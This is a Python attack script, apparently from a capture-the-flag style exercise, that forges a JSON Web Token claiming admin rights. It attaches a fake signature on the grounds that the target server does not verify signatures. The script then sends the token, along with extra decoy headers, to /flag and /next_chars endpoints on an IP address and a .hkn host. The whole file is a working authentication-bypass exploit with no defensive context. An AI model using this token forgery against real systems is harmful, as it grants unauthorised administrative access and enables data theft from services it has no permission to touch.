#!/usr/bin/env python3
import base64, json, requests, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "HS256", "typ": "JWT"}
header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())

# Forge admin:true. Signature is left as garbage/reused since .37 doesn't validate it.
payload_true = {"admin": True, "timestamp": int(time.time())}
payload_b64 = b64url(json.dumps(payload_true, separators=(",", ":")).encode())

fake_sig = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"
forged_jwt = f"{header_b64}.{payload_b64}.{fake_sig}"

print(f"Forged JWT (admin:true): {forged_jwt}\n")

targets = [
    ("http://77.76.10.37/flag", None),
    ("http://77.76.10.37/next_chars", {"char": "s"}),
    ("http://magic-key.hkn/flag", None),
    ("http://magic-key.hkn/next_chars", {"char": "s"}),
]

for url, params in targets:
    print(f"### GET {url} params={params} with JWT header (admin:true, forged sig) ###")
    r = requests.get(url, params=params, headers={"JWT": forged_jwt}, timeout=5)
    print(f"  -> {r.status_code}: {r.text.strip()[:300]}\n")

# Also try combined with the Session-Token/URL headers in case BOTH are required together
print("### Combo: JWT (admin:true) + Session-Token(decoy) + URL-Maybe:/flag, against /flag on magic-key.hkn ###")
r = requests.get("http://magic-key.hkn/flag", headers={
    "JWT": forged_jwt,
    "Session-Token": "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA",
    "URL-Maybe": "/flag"
}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:300]}\n")

print("### Combo: JWT (admin:true) against secret-server /flag with URL header too ###")
r = requests.get("http://77.76.10.37/flag", headers={
    "JWT": forged_jwt,
    "URL": "/flag"
}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:300]}\n")
